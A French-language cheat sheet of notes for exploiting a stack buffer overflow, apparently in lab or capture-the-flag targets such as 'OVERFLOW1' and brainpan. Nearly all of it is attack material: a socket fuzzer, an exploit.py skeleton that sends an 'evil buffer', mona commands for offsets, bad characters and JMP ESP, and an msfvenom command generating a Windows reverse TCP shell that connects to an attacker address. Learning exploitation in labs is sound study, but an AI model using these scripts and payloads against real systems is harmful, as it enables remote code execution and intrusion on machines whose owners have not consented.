
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3333  connectaddress=127.0.0.1 connectport=4444 protocol=tcp
```

# Retrouver offset

Dans Immunity debugger :
```
!mona config -set workingfolder c:\mona\%p
#%p = nom du fichier sans extension
```

Sur machine kali exécuter : (noter quand crash)
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.220.0"

port = 9999
timeout = 5
prefix = "OVER "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

exploit.py
```
import socket

ip = "10.10.220.0"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Si info a entrer avant : ajouter :
```
nomvariable = "test\n"
s.send(bytes(nomvariable, "latin-1"))
```

payload
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

**Récupérer valeur de l'EIP**

```
/usr/bin/msf-pattern_offset -l 600 -q 35724134
```

**Récupérer la valeur de l'offset** 

Dans variable retn : BBBB (EIP)

# Trouver les bad char

Dans Immunity Debuger
```
!mona bytearray -b "\x00"
```

Créer liste de bad char (dans payloads)
```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Exécuter l'exploit

Dans Immunity Debugger
```
!mona compare -f C:\mona\brainpan\bytearray.bin -a <ESP_ADDRESS>
```

Possible badchar en + : \x0a\x0d

# Jump

```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

Récupérer valeur en inversant

`\xaf\x11\x50\x62`

Générer le shell code
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.73.224 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

Générer des NOP : "\x90"x10

